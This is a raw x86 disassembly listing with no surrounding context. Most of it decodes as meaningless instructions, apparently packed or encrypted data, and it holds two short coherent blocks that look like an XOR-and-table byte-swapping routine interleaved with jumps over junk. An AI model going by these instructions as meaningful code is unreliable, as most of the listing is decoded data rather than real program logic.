  40c1d1:	lods   eax,DWORD PTR ds:[esi]
  40c1d2:	ret    
  40c1d3:	popa   
  40c1d4:	ds aam 0x3c
  40c1d7:	into   
  40c1d8:	or     al,0xc5
  40c1da:	xor    eax,DWORD PTR [edi+0x52]
  40c1dd:	fdivr  QWORD PTR [eax+0x6a]
  40c1e0:	lds    ecx,FWORD PTR [ebx+eax*8+0x5234d71d]
  40c1e7:	and    al,BYTE PTR [esi-0x4c]
  40c1ea:	pop    ebx
  40c1eb:	ret    0xcc84
  40c1ee:	push   eax
  40c1ef:	fnsave [ebp+0x34026c9e]
  40c1f5:	popa   
  40c1f6:	rcl    BYTE PTR ds:0xcde04ed7,0x17
  40c1fd:	push   esp
  40c1fe:	pop    esp
  40c1ff:	out    0xcc,eax
  40c201:	xchg   ebp,eax
  40c202:	ds push edx
  40c204:	adc    DWORD PTR [esi-0x4a],esi
  40c207:	mov    edi,DWORD PTR [ebp+0x6e67037e]
  40c20d:	call   0xe5cd:0xd3b35f5b
  40c214:	fistp  WORD PTR [esi+edx*1]
  40c217:	xchg   edi,eax
  40c218:	icebp  
  40c219:	and    eax,0x361eeb18
  40c21e:	mov    edx,0x7ca3f82d
  40c223:	idiv   DWORD PTR [ecx+0x6066599e]
  40c229:	sbb    eax,0xefaf55f0
  40c22e:	cmp    ch,BYTE PTR [ecx]
  40c230:	cmp    BYTE PTR [esi-0x1a],dh
  40c233:	lea    esp,[ebx+0x2fe979a2]
  40c239:	fbld   TBYTE PTR [eax+0x3c]
  40c23c:	mov    ebp,esp
  40c23e:	sti    
  40c23f:	adc    al,0x68
  40c241:	fidiv  DWORD PTR [ecx]
  40c243:	inc    eax
  40c244:	push   ss
  40c245:	int    0x79
  40c247:	and    eax,DWORD PTR [edi+ebp*1-0x35d8232f]
  40c24e:	pop    ds
  40c24f:	inc    edx
  40c250:	mov    bh,0x21
  40c252:	mov    esp,0x899aa2d6
  40c257:	mov    BYTE PTR [edi],dl
  40c259:	sub    DWORD PTR ds:0x99758bd2,esp
  40c25f:	xchg   ebx,eax
  40c260:	ds jno 0x40c204
  40c263:	mov    edi,ebp
  40c265:	and    DWORD PTR [ebp+0x58],eax
  40c268:	rol    BYTE PTR [ecx],0x8
  40c26b:	add    ch,0x91
  40c26e:	and    eax,0x7e97c825
  40c273:	add    dl,ch
  40c275:	jne    0x40c26a
  40c277:	out    dx,al
  40c278:	dec    esp
  40c279:	or     al,0xe6
  40c27b:	fs cli 
  40c27d:	hlt    
  40c27e:	cmp    al,0x27
  40c280:	mov    bh,0x83
  40c282:	jne    0x40c255
  40c284:	mov    ch,0x81
  40c286:	fdiv   DWORD PTR ds:0x1365a7d2
  40c28c:	dec    esi
  40c28d:	es (bad) 
  40c28f:	push   edi
  40c290:	scas   al,BYTE PTR es:[edi]
  40c291:	mov    ds:0x7eb1f00d,eax
  40c296:	es aam 0x39
  40c299:	test   eax,0x4c0316ed
  40c29e:	(bad)  
  40c29f:	sti    
  40c2a0:	hlt    
  40c2a1:	pop    edx
  40c2a2:	add    BYTE PTR [eax+0x8],al
  40c2a5:	add    ecx,DWORD PTR ds:0x7111b7b1
  40c2ab:	mov    ds:0x4e599d19,al
  40c2b0:	add    BYTE PTR [eax+0x45f6a13b],bl
  40c2b6:	cmp    ebx,DWORD PTR [eax-0x2431bbb]
  40c2bc:	pop    edx
  40c2bd:	jae    0x40c2da
  40c2bf:	cmp    eax,0x5b8b22e5
  40c2c4:	mov    ds,WORD PTR [ecx*8+0x6d6bcff6]
  40c2cb:	sub    BYTE PTR [edi+0x627f04c6],0xa8
  40c2d2:	jp     0x40c2d4
  40c2d4:	daa    
  40c2d5:	mov    edi,0xf9f648e6
  40c2db:	popf   
  40c2dc:	call   0xa3e651c1
  40c2e1:	jle    0x40c266
  40c2e3:	cmp    DWORD PTR [ebp+0x57],esi
  40c2e6:	inc    edi
  40c2e7:	out    dx,eax
  40c2e8:	pop    eax
  40c2e9:	je     0x40c2c9
  40c2eb:	clc    
  40c2ec:	pop    eax
  40c2ed:	mov    bh,0x86
  40c2ef:	sbb    ah,ch
  40c2f1:	ins    DWORD PTR es:[edi],dx
  40c2f2:	clc    
  40c2f3:	repz jno 0x40c2ba
  40c2f6:	pop    eax
  40c2f7:	retf   
  40c2f8:	add    DWORD PTR [eax+0x6c],esi
  40c2fb:	sti    
  40c2fc:	pusha  
  40c2fd:	or     cl,BYTE PTR [edx-0x15dd23bd]
  40c303:	fs mov dh,0x1b
  40c306:	or     dh,bl
  40c308:	dec    esp
  40c309:	sbb    al,0x70
  40c30b:	push   ss
  40c30c:	mov    al,ds:0x8058294a
  40c311:	fcmovbe st,st(4)
  40c313:	mov    ds:0x3ad59ab4,al
  40c318:	(bad)  [eax]
  40c31a:	mov    DWORD PTR [ecx],esp
  40c31c:	in     al,dx
  40c31d:	push   ecx
  40c31e:	adc    al,0xc1
  40c320:	or     eax,0xf54113e5
  40c325:	and    al,0x91
  40c327:	out    dx,eax
  40c328:	mov    dl,0x4a
  40c32a:	inc    ebp
  40c32b:	push   esp
  40c32c:	sbb    edi,ecx
  40c32e:	and    al,0x38
  40c330:	shl    BYTE PTR [eax+0x21],0x61
  40c334:	outs   dx,BYTE PTR ds:[esi]
  40c335:	js     0x40c32e
  40c337:	jl     0x40c322
  40c339:	ds leave 
  40c33b:	mov    ecx,0x4f1ba1f9
  40c340:	rcr    BYTE PTR [ecx+0x2e],0xe1
  40c344:	jb     0x40c368
  40c346:	push   edx
  40c347:	xchg   ecx,eax
  40c348:	out    dx,al
  40c349:	es enter 0x826c,0x4e
  40c34e:	enter  0x5ebe,0xe
  40c352:	xchg   esp,eax
  40c353:	mov    al,ds:0xcb66bd9e
  40c358:	aaa    
  40c359:	aam    0xb1
  40c35b:	mov    esi,0xe1c649a6
  40c360:	add    ah,al
  40c362:	mov    ah,0xe4
  40c364:	dec    ebp
  40c365:	push   eax
  40c366:	clc    
  40c367:	mov    ah,BYTE PTR [ebp-0xff3e22c]
  40c36d:	add    eax,0xd8ba390d
  40c372:	scas   al,BYTE PTR es:[edi]
  40c373:	pop    esp
  40c374:	fsubr  QWORD PTR [eax+ebp*2-0x72]
  40c378:	(bad)  
  40c379:	mov    edx,0x82743cc5
  40c37e:	shl    BYTE PTR [ebp-0x58],1
  40c381:	(bad)  
  40c382:	fnsave [edx+0x2]
  40c385:	mov    bl,BYTE PTR [edi-0x7b52d5ac]
  40c38b:	retf   0xf609
  40c38e:	mov    al,BYTE PTR [ebp-0x39df7832]
  40c394:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c395:	inc    esp
  40c396:	cmp    dl,BYTE PTR [eax+eiz*4-0x3a588604]
  40c39d:	push   edi
  40c39e:	pop    esp
  40c39f:	stc    
  40c3a0:	add    eax,0xac5176cb
  40c3a5:	push   ss
  40c3a6:	add    BYTE PTR cs:[eax+0xe3872f9],dl
  40c3ad:	in     eax,dx
  40c3ae:	xor    dl,BYTE PTR ds:[ebx+0x2b]
  40c3b2:	loopne 0x40c35d
  40c3b4:	cmp    cl,dl
  40c3b6:	aad    0x7b
  40c3b8:	mov    edi,0xc113871b
  40c3bd:	dec    eax
  40c3be:	xchg   edi,eax
  40c3bf:	xor    bh,bh
  40c3c1:	dec    edi
  40c3c2:	adc    cl,BYTE PTR [ebx-0x53]
  40c3c5:	stc    
  40c3c6:	xchg   ebx,eax
  40c3c7:	inc    esi
  40c3c8:	push   ss
  40c3c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3ca:	mov    bl,0x18
  40c3cc:	js     0x40c445
  40c3ce:	sbb    BYTE PTR [ecx-0x62],bh
  40c3d1:	mov    edi,0x8b7e1252
  40c3d6:	pop    esp
  40c3d7:	mov    ebx,0x5c7b03a6
  40c3dc:	sbb    eax,DWORD PTR [ebp+0x44baa079]
  40c3e2:	jle    0x40c416
  40c3e4:	out    dx,eax
  40c3e5:	in     al,0xdf
  40c3e7:	adc    dl,0x1e
  40c3ea:	nop
  40c3eb:	js     0x40c414
  40c3ed:	cmp    eax,0x4e4de091
  40c3f2:	mov    esi,esp
  40c3f4:	test   eax,edx
  40c3f6:	pop    eax
  40c3f7:	mov    bh,0x11
  40c3f9:	sbb    al,0x49
  40c3fb:	pushf  
  40c3fc:	lea    edi,[esi+ebp*8+0x2f9263e5]
  40c403:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c404:	outs   dx,DWORD PTR ds:[esi]
  40c405:	ret    0x35ea
  40c408:	mov    edi,0x5948b436
  40c40d:	test   DWORD PTR ds:0x899d18e8,ebp
  40c413:	sub    BYTE PTR [bx+di+0x78f3],0x2b
  40c419:	cmp    dh,BYTE PTR [edx-0x42]
  40c41c:	dec    edi
  40c41d:	push   ecx
  40c41e:	xor    eax,0xe6486e6a
  40c423:	mov    dh,0x4e
  40c425:	cmp    edx,0xb05c7d9d
  40c42b:	dec    eax
  40c42c:	xor    BYTE PTR [ecx],dl
  40c42e:	mov    bh,0x88
  40c430:	(bad)
  40c433:	pusha  
  40c434:	jle    0x40c3e8
  40c436:	data16 fstp QWORD PTR [ebp+0x41107b18]
  40c43d:	or     esi,esp
  40c43f:	jl     0x40c498
  40c441:	mov    ebp,0x2ddfb747
  40c446:	pop    ds
  40c447:	add    BYTE PTR [edi+0x37],dl
  40c44a:	sti    
  40c44b:	mov    al,ds:0x30bfd205
  40c450:	push   esi
  40c451:	push   esp
  40c452:	loop   0x40c4b7
  40c454:	sub    BYTE PTR [ecx-0x6e],0xac
  40c458:	test   BYTE PTR [eax-0x4d354a9c],dh
  40c45e:	jmp    0xdb175a83
  40c463:	ror    ebp,1
  40c465:	or     DWORD PTR [eax-0x4b],edx
  40c468:	aad    0x2a
  40c46a:	aam    0x5f
  40c46c:	add    ch,BYTE PTR [ebx+edi*2-0x3033a0b9]
  40c473:	xchg   ebp,eax
  40c474:	dec    ebx
  40c475:	sub    eax,0xbdc27417
  40c47a:	bound  esp,QWORD PTR ds:[ebp+0x4]
  40c47e:	retf   
  40c47f:	xor    cl,BYTE PTR [eax+0x52]
  40c482:	sub    DWORD PTR [eax-0x78],edx
  40c485:	enter  0xe551,0x46
  40c489:	in     al,dx
  40c48a:	push   ebp
  40c48b:	enter  0x8ba5,0x7d
  40c48f:	scas   eax,DWORD PTR es:[edi]
  40c490:	popf   
  40c491:	retf   
  40c492:	or     DWORD PTR [ebx-0x4e],eax
  40c495:	xchg   esp,eax
  40c496:	mov    eax,0x6e128d8d
  40c49b:	push   esp
  40c49c:	(bad)  
  40c49d:	frstor [edi]
  40c49f:	push   ecx
  40c4a0:	mov    bh,0xd6
  40c4a2:	push   esi
  40c4a3:	inc    edi
  40c4a4:	xor    eax,0xad8654dd
  40c4a9:	pop    ecx
  40c4aa:	mov    bl,ch
  40c4ac:	ret    
  40c4ad:	lock inc edi
  40c4af:	int3   
  40c4b0:	jmp    0x1fed:0x141e9312
  40c4b7:	xor    BYTE PTR [edi],dh
  40c4b9:	sub    ch,BYTE PTR [ebp+esi*2+0x35]
  40c4bd:	sbb    al,0xf1
  40c4bf:	xchg   edi,eax
  40c4c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c4c1:	arpl   bp,dx
  40c4c3:	add    BYTE PTR [eax],ch
  40c4c5:	pop    ebp
  40c4c6:	dec    edi
  40c4c7:	cmp    ebx,DWORD PTR [ebp+0x5a]
  40c4ca:	xor    DWORD PTR [ecx+0x4d],ebp
  40c4cd:	mov    WORD PTR [ebp+0x69],cs
  40c4d0:	test   eax,0x7565e3b8
  40c4d5:	push   esp
  40c4d6:	pop    esp
  40c4d7:	in     al,dx
  40c4d8:	les    eax,FWORD PTR [eax]
  40c4da:	mov    edx,0x651db1e7
  40c4df:	jmp    0xea2a6d3d
  40c4e4:	pop    eax
  40c4e5:	sar    DWORD PTR [edx+0x58af2a75],0xf6
  40c4ec:	and    BYTE PTR ss:[edx],cl
  40c4ef:	xor    BYTE PTR [ebx],dh
  40c4f1:	rol    BYTE PTR [ebx],1
  40c4f3:	push   ebp
  40c4f4:	in     al,dx
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	fs and dh,bh
  40c543:	pop    ss
  40c544:	dec    ebp
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c531
  40c54d:	mov    eax,0xaa6a6e8b
  40c552:	fst    DWORD PTR [edi]
  40c554:	dec    edi
  40c555:	xchg   edx,eax
  40c556:	cmp    BYTE PTR [eax+0x5d],bh
  40c559:	mov    esp,0x13aa39a5
  40c55e:	test   eax,0x321453f2
  40c563:	ret    0x8de6
  40c566:	div    ah
  40c568:	cdq    
  40c569:	xchg   esp,eax
  40c56a:	inc    esp
  40c56b:	jbe    0x40c593
  40c56d:	fs stc 
  40c56f:	mov    eax,ds:0x3c596ef6
  40c575:	loopne 0x40c559
  40c577:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c578:	jle    0x40c551
  40c57a:	xlat   BYTE PTR ds:[ebx]
  40c57b:	jb     0x40c5b7
  40c57d:	mov    ecx,0x85454290
  40c582:	inc    esi
  40c583:	dec    esp
  40c584:	mov    DWORD PTR [eax+0x322ac13a],esi
  40c58a:	mov    ecx,DWORD PTR [esi+0x44]
  40c58d:	push   ecx
  40c58e:	mov    edi,0x7254fe28
  40c593:	and    BYTE PTR [esi],ah
  40c595:	mov    edx,DWORD PTR [esi]
  40c597:	and    al,0xde
  40c599:	mov    esi,0x650db3fd
  40c59e:	mov    ds:0x6b0ed838,eax
  40c5a3:	fistp  DWORD PTR [ecx+ecx*8]
  40c5a6:	stc    
  40c5a7:	test   eax,0x44cd8147
  40c5ac:	mov    ds:0x2ac13ec7,al
  40c5b1:	sub    bl,ch
  40c5b3:	xlat   BYTE PTR ds:[ebx]
  40c5b4:	lea    edx,ds:0xefff2064
  40c5ba:	hlt    
  40c5bb:	pop    ecx
  40c5bc:	int3   
  40c5bd:	stos   DWORD PTR es:[edi],eax
  40c5be:	out    dx,eax
  40c5bf:	jns    0x40c551
  40c5c1:	dec    eax
  40c5c2:	retf   0xf21
  40c5c5:	adc    dh,BYTE PTR [esi]
  40c5c7:	(bad)  
  40c5c8:	lahf   
  40c5c9:	not    BYTE PTR [esi-0x41]
  40c5cc:	leave  
  40c5cd:	rcr    DWORD PTR [edi-0x431eb4],0x49
  40c5d4:	inc    eax
  40c5d5:	push   esp
  40c5d6:	jge    0x40c647
  40c5d8:	shl    BYTE PTR [esi-0x13c31a1a],cl
  40c5de:	and    al,0x23
  40c5e0:	push   ebx
  40c5e1:	sub    DWORD PTR [ebx+eiz*1],ecx
  40c5e4:	mov    ds:0x8b48eda4,al
  40c5e9:	cwde   
  40c5ea:	jg     0x40c57b
  40c5ec:	sbb    DWORD PTR [esi+edx*8+0x324db81a],edx
  40c5f3:	mov    ebx,0x62560ddb
  40c5f8:	mov    DWORD PTR [esi+0x7c5ce5ad],edx
  40c5fe:	out    0x1e,al
  40c600:	aad    0xe6
  40c602:	(bad)  
  40c604:	mov    dh,0xf8
  40c606:	xchg   edi,eax
  40c607:	dec    edi
  40c608:	cmp    eax,0xa514e27b
  40c60d:	or     ecx,DWORD PTR [edx-0x2a]
  40c610:	jo     0x40c5c5
  40c612:	fsub   QWORD PTR [ebx-0x3a]
  40c615:	lock add eax,0xd705733a
  40c61b:	cdq    
  40c61c:	arpl   WORD PTR [ebx+0x7e],bp
  40c61f:	jp     0x40c5be
  40c621:	xchg   ecx,eax
  40c622:	inc    ecx
  40c623:	pop    eax
  40c624:	and    ecx,DWORD PTR [edi]
  40c626:	push   0x1a
  40c628:	(bad)  
  40c629:	mul    al
  40c62b:	fwait
  40c62c:	test   al,0xcc
  40c62e:	inc    ecx
  40c62f:	stc    
  40c630:	test   BYTE PTR [esi-0x18],0x7c
  40c634:	pushf  
  40c635:	fiadd  DWORD PTR [eax-0x75]
  40c638:	das    
  40c639:	into   
  40c63a:	ret    
  40c63b:	jnp    0x40c5fd
  40c63d:	cmp    eax,0xcd1181
  40c642:	addr16 enter 0x9f1d,0x70
  40c647:	add    BYTE PTR [edi+ebx*8-0x2229aa92],ah
  40c64e:	fisub  DWORD PTR [edi+0x1e]
  40c651:	loopne 0x40c5d9
  40c653:	push   ebx
  40c654:	hlt    
  40c655:	inc    ebp
  40c656:	pop    es
  40c657:	inc    ebx
  40c658:	pop    edi
  40c659:	push   eax
  40c65a:	or     DWORD PTR [ebx-0x3],esi
  40c65d:	fld    DWORD PTR [eax]
  40c65f:	seta   BYTE PTR [edx+ebx*1+0x20]
  40c664:	add    DWORD PTR [ebx-0x48],ecx
  40c667:	clc    
  40c668:	mov    edi,0x5926319a
  40c66d:	pop    edi
  40c66e:	std    
  40c66f:	adc    ah,cl
  40c671:	mov    bl,0x11
  40c673:	pop    ds
  40c674:	pop    ss
  40c675:	adc    edi,esi
  40c677:	jbe    0x40c65c
  40c679:	mov    cl,0x25
  40c67b:	outs   dx,BYTE PTR ds:[esi]
  40c67c:	in     eax,dx
  40c67d:	cdq    
  40c67e:	ds push es
  40c680:	imul   sp,sp,0xff82
  40c684:	int    0x9f
  40c686:	mov    cl,0x6b
  40c688:	(bad)  
  40c689:	out    dx,al
  40c68a:	or     al,0x74
  40c68c:	arpl   WORD PTR [ebx+esi*8+0x64050821],dx
  40c693:	mov    edx,DWORD PTR ds:0x8079d83c
  40c699:	hlt    
  40c69a:	dec    eax
  40c69b:	retf   0x386b
  40c69e:	cmp    al,0xec
  40c6a0:	push   0x81c4ad3f
  40c6a5:	adc    BYTE PTR [eax+eax*1],bl
  40c6a8:	inc    edx
  40c6a9:	push   ds
  40c6aa:	sbb    al,0x7f
  40c6ac:	outs   dx,BYTE PTR ds:[esi]
  40c6ad:	sbb    DWORD PTR [edi-0x8],ecx
  40c6b0:	jnp    0x40c63a
  40c6b2:	or     cl,BYTE PTR [esi+0x3]
  40c6b5:	inc    esp
  40c6b6:	lds    esi,FWORD PTR [edx]
  40c6b8:	inc    ebx
  40c6b9:	mov    edx,0xd6c696fd
  40c6be:	mov    ecx,0x7de61f45
  40c6c3:	mov    cl,0x2
  40c6c5:	sub    ebx,edi
  40c6c7:	jnp    0x40c6c7
  40c6c9:	sub    eax,0xe57fe113
  40c6ce:	add    esp,DWORD PTR [edi+ebp*4+0x22]
  40c6d2:	sbb    DWORD PTR [ebp-0x350a1a51],edx
  40c6d8:	imul   ebp,edi,0xe1070d20
  40c6de:	or     BYTE PTR [ebx+ecx*4+0x4ff5ba50],ch
  40c6e5:	lock nop
  40c6e7:	hlt    
  40c6e8:	fsubrp st(1),st
  40c6ea:	out    0xcf,al
  40c6ec:	xor    eax,0x5c910d42
  40c6f1:	push   ss
  40c6f2:	imul   ebx,DWORD PTR [ecx],0xffffffb0
  40c6f5:	ret    0x670
  40c6f8:	add    eax,DWORD PTR [eax+0x44225075]
  40c6fe:	adc    bl,BYTE PTR [ebx+0x28]
  40c701:	adc    bl,ch
  40c703:	or     al,0xd
  40c705:	enter  0xe5aa,0x72
  40c709:	xlat   BYTE PTR ds:[ebx]
  40c70a:	daa    
  40c70b:	push   esi
  40c70c:	jmp    0x40c6c4
  40c70e:	adc    BYTE PTR [ecx],al
  40c710:	or     BYTE PTR [ebx+0x40],bl
  40c713:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40c715:	push   ebp
  40c716:	inc    eax
  40c717:	jp     0x40c762
  40c719:	rep outs dx,DWORD PTR ds:[esi]
  40c71b:	push   0xffffffbf
  40c71d:	imul   ecx,DWORD PTR [ecx-0x42193e8a],0xffffffb2
  40c724:	sub    DWORD PTR [ecx],esi
  40c726:	dec    esi
  40c727:	push   ss
  40c728:	xchg   esi,eax
  40c729:	test   ecx,0x41e242a7
  40c72f:	mov    ds:0xe2c282,al
  40c734:	xor    eax,0xbfa6789e
  40c739:	ror    DWORD PTR [edi-0x12],0xf6
  40c73d:	push   ebx
  40c73e:	fbld   TBYTE PTR [ebp+0x7f]
  40c741:	fdivr  st,st(1)
  40c743:	fist   WORD PTR [edx]
  40c745:	clc    
  40c746:	push   ds
  40c747:	mov    cl,dh
  40c749:	sub    eax,esp
  40c74b:	or     BYTE PTR [edi+0x13e0ec2f],dl
  40c751:	imul   eax,ebp,0x5b
  40c754:	and    eax,0x79530317
  40c759:	clc    
  40c75a:	push   edi
  40c75b:	sub    edi,DWORD PTR [edi-0x23d408d4]
  40c761:	in     al,dx
  40c762:	or     DWORD PTR [eax-0x6e],ebp
  40c765:	test   DWORD PTR [edi],edi
  40c767:	mov    dh,0x7b
  40c769:	jns    0x40c7de
  40c76b:	or     DWORD PTR [edi+0x2d],ecx
  40c76e:	stos   BYTE PTR es:[edi],al
  40c76f:	cmp    DWORD PTR [edi],esi
  40c771:	or     BYTE PTR fs:[edi],0x79
  40c775:	lea    ebp,[ebp-0x3e6d9fa1]
  40c77b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c77c:	sbb    dh,BYTE PTR [eax+0x1651450d]
  40c782:	clc    
  40c783:	sub    eax,0x8849bd9e
  40c788:	add    ebp,DWORD PTR [ebx+eax*4]
  40c78b:	dec    edi
  40c78c:	dec    esi
  40c78d:	(bad)
  40c790:	push   edi
  40c791:	mov    DWORD PTR [ebp+0x1b],eax
  40c794:	stos   DWORD PTR es:[edi],eax
  40c795:	mov    ah,0xcb
  40c797:	or     esp,ecx
  40c799:	sub    DWORD PTR [esi-0x3bc1de98],0x38b1ac13
  40c7a3:	mov    ds:0x1c56b984,al
  40c7a8:	dec    BYTE PTR [esi+0x44c894b0]
  40c7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7af:	inc    edx
  40c7b0:	sbb    DWORD PTR [ecx+edx*1+0x6ea4ace8],eax
  40c7b7:	push   esi
  40c7b8:	(bad)  
  40c7ba:	in     eax,0x7b
  40c7bc:	add    DWORD PTR [eax-0x295b511d],ebp
  40c7c2:	scas   eax,DWORD PTR es:[edi]
  40c7c3:	in     al,dx
  40c7c4:	pop    esp
  40c7c5:	mov    edx,0x835aac2b
  40c7ca:	ret    
  40c7cb:	push   cs
  40c7cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7cd:	inc    ebp
  40c7ce:	jmp    0xb6dc78b8
  40c7d3:	ror    ebx,cl
  40c7d5:	mov    ebp,0x3afe58cf
  40c7da:	pop    ds
  40c7db:	xchg   ebp,eax
  40c7dc:	xor    edx,edx
  40c7de:	or     DWORD PTR [edx],eax
  40c7e0:	xchg   ecx,eax
  40c7e1:	int    0x4c
  40c7e3:	jo     0x40c82d
  40c7e5:	in     al,dx
  40c7e6:	test   al,0x4e
  40c7e8:	dec    eax
  40c7e9:	pushf  
  40c7ea:	fdiv   QWORD PTR [edi]
  40c7ec:	and    al,0x17
  40c7ee:	fsub   DWORD PTR [esi+0x8]
  40c7f1:	cmp    eax,0x6a722f29
  40c7f6:	cmp    DWORD PTR [edi-0x1b],edx
  40c7f9:	dec    esp
  40c7fa:	test   ecx,0xdb01c00b
  40c800:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c801:	in     al,dx
  40c802:	inc    edi
  40c803:	hlt    
  40c804:	xchg   DWORD PTR [ebx+esi*4-0xc],edx
  40c808:	call   0xd4ed56b1
  40c80d:	repnz les esi,FWORD PTR [edi+0x79]
  40c811:	mov    eax,0x7b34fdbb
  40c816:	outs   dx,BYTE PTR ds:[esi]
  40c817:	in     eax,dx
  40c818:	mov    ecx,0x98b6efc9
  40c81d:	stos   DWORD PTR es:[edi],eax
  40c81e:	daa    
  40c81f:	or     BYTE PTR [ebp+0x56],bl
  40c822:	cmp    al,BYTE PTR [edi]
  40c824:	pushf  
  40c825:	pop    esp
  40c826:	pop    edx
  40c827:	outs   dx,BYTE PTR ds:[esi]
  40c828:	clc    
  40c829:	scas   al,BYTE PTR es:[edi]
  40c82a:	call   0x8df278ac
  40c82f:	aaa    
  40c830:	dec    eax
  40c831:	mov    bh,ah
  40c833:	sub    bh,BYTE PTR [bp+di]
  40c836:	(bad)  
  40c837:	cdq    
  40c838:	(bad)  
  40c839:	push   cs
  40c83a:	jecxz  0x40c876
  40c83c:	ret    0x7613
  40c83f:	pop    esp
  40c840:	fwait
  40c841:	sub    al,0x79
  40c843:	push   ecx
  40c844:	fcmovnu st,st(3)
  40c846:	sbb    DWORD PTR [eax-0x41],0x5dea6d08
  40c84d:	adc    ch,BYTE PTR [ebp+0x7d56f2cf]
  40c853:	stos   DWORD PTR es:[edi],eax
  40c854:	popf   
  40c855:	jecxz  0x40c893
  40c857:	add    eax,0x452bcf66
  40c85c:	cmc    
  40c85d:	jmp    0x7bc72021
  40c862:	in     eax,0xe3
  40c864:	ret    0x2341
  40c867:	ss mov dl,0x2d
  40c86a:	cmp    edi,ebx
  40c86c:	bound  edi,QWORD PTR [ebp-0x7a3d35d5]
  40c872:	into   
  40c873:	shr    BYTE PTR [edi+ecx*4],0x61
  40c877:	jo     0x40c8a2
  40c879:	xlat   BYTE PTR ds:[ebx]
  40c87a:	aad    0x54
  40c87c:	jp     0x40c83e
  40c87e:	pop    esi
  40c87f:	xchg   edx,eax
  40c880:	and    dl,0x3a
  40c883:	arpl   WORD PTR [ebx],cx
  40c885:	jmp    0x73bb1c90
  40c88a:	add    al,BYTE PTR [edi-0x57]
  40c88d:	jne    0x40c8b6
  40c88f:	sub    bl,BYTE PTR [ebx+0x64]
  40c892:	int3   
  40c893:	jns    0x40c818
  40c895:	bnd jbe 0x40c852
  40c898:	cmp    BYTE PTR [ecx-0x47],bl
  40c89b:	scas   al,BYTE PTR es:[edi]
  40c89c:	mov    ebx,0xef3916e9
  40c8a1:	jno    0x40c86e
  40c8a3:	ror    DWORD PTR ds:0x6c88fb4e,0xe4
  40c8aa:	adc    DWORD PTR [eax],ecx
  40c8ac:	fsub   DWORD PTR [ecx+0x2aa7032d]
  40c8b2:	in     eax,0xdd
  40c8b4:	(bad)  
  40c8b5:	mov    esp,0x679eb1a6
  40c8ba:	add    bh,dh
  40c8bc:	mov    ah,0xef
  40c8be:	mov    ds:0xff237c5d,al
  40c8c3:	loopne 0x40c92b
  40c8c5:	fnop   
  40c8c7:	push   es
  40c8c8:	lock nop
  40c8ca:	jge    0x40c887
  40c8cc:	sub    al,BYTE PTR [ecx-0x4c8ae395]
  40c8d2:	mov    ss,WORD PTR [ecx+0x6]
  40c8d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8d6:	add    cl,0x4e
  40c8d9:	lds    esi,FWORD PTR [ecx-0x24119992]
  40c8df:	out    0x49,eax
  40c8e1:	and    ecx,0x32
  40c8e4:	shr    DWORD PTR [eax],0xc2
  40c8e7:	cmp    DWORD PTR [ebx],ecx
  40c8e9:	stos   BYTE PTR es:[edi],al
  40c8ea:	adc    al,0x2f
  40c8ec:	sub    DWORD PTR [ebx-0x7cc1783],ecx
  40c8f2:	add    edi,DWORD PTR [ebp-0x14]
  40c8f5:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8f8:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c8ff:	mov    edx,DWORD PTR [ebp-0x44]
  40c902:	mov    edi,DWORD PTR [ebp-0xc]
  40c905:	xor    edx,eax
  40c907:	jmp    0x40ccc5
  40c90c:	sbb    al,0xba
  40c90e:	pop    edx
  40c90f:	pop    edx
  40c910:	pop    edx
  40c911:	pop    edx
  40c912:	sbb    al,0xba
  40c914:	adc    edi,DWORD PTR [edi+edi*1-0x3]
  40c918:	jo     0x40c8b7
  40c91a:	add    bh,BYTE PTR [esi-0x14]
  40c91d:	xchg   esp,eax
  40c91e:	jo     0x40c990
  40c920:	lahf   
  40c921:	jge    0x40c993
  40c923:	jo     0x40c94e
  40c925:	repz test BYTE PTR [eax-0xb],0xf6
  40c92a:	adc    DWORD PTR [esi+0x4e],ecx
  40c92d:	loop   0x40c974
  40c92f:	mov    edx,0xedfc02a7
  40c934:	icebp  
  40c935:	sbb    edx,DWORD PTR ds:0x9dbb2ecc
  40c93b:	aam    0x49
  40c93d:	mov    DWORD PTR [edx],0x77d06715
  40c943:	in     al,0x25
  40c945:	mov    ss,WORD PTR [ebp+0xb6f45ce]
  40c94b:	xchg   BYTE PTR [edi-0x17],ah
  40c94e:	stos   DWORD PTR es:[edi],eax
  40c94f:	or     edi,DWORD PTR [ecx+0x6416125b]
  40c955:	inc    ebp
  40c956:	or     cl,dh
  40c958:	xlat   BYTE PTR ds:[ebx]
